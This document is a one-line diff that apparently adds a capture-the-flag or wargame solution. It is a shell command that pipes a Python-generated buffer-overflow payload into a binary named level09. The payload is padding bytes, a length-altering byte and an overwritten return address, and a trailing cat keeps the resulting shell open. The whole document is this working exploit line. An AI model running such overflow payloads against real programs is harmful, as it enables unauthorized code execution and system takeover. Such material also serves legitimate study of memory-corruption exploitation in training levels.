@@ -1,0 +1,1 @@
+(python -c "print(40*'a'+'\xff'+286*'b'+'\x8c\x48\x55\x55\x55\x55\x00')"; cat) | ./level09
